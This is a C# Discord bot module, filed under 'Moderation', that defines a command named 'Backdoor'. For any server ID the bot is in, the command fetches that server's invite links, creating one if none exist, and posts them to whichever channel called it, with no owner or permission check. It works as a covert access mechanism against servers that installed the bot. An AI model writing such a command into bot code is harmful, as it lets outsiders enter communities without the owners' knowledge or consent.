using System;
using System.Text;
using System.Collections.Generic;
using Discord;
using Discord.Commands;
using System.Threading.Tasks;
using System.Linq;
using Discord.WebSocket;

namespace DiscordBot.Core.Moderation
{
    public class Backdoor : ModuleBase<SocketCommandContext>
    {
        [Command("Backdoor"), Summary("Get the invite of a server")]
        public async Task backdoor(ulong GuildId )
        {

            if (Context.Client.Guilds.Where(x => x.Id == GuildId).Count() < 1)
            {
                await Context.Channel.SendMessageAsync(":x: I am not in a guild with id = " + GuildId);
                return;
            }
            SocketGuild Guild = Context.Client.Guilds.Where(x => x.Id == GuildId).FirstOrDefault();
            var Invites = await Guild.GetInvitesAsync();
            if (Invites.Count < 1)
            {
                try
                {
                    await Guild.TextChannels.First().CreateInviteAsync();
                }
                catch (Exception e)
                {
                    await Context.Channel.SendMessageAsync($":x: Creating an invite for Guild {Guild.Name} went wrong with error ``{e.Message}´´");
                    return; 
                }
            }

            Invites = null;
            Invites = await Guild.GetInvitesAsync();
            EmbedBuilder embed = new EmbedBuilder();
            embed.WithAuthor($"Invites from guild {Guild.Name}:", Guild.IconUrl);
            embed.WithColor(40, 200, 150);
            foreach (var Current in Invites)
            {
                embed.AddField("Invite: ", $"[Invite]({Current.Url})");
            }

            await Context.Channel.SendMessageAsync("", false, embed.Build());

        }
    }
}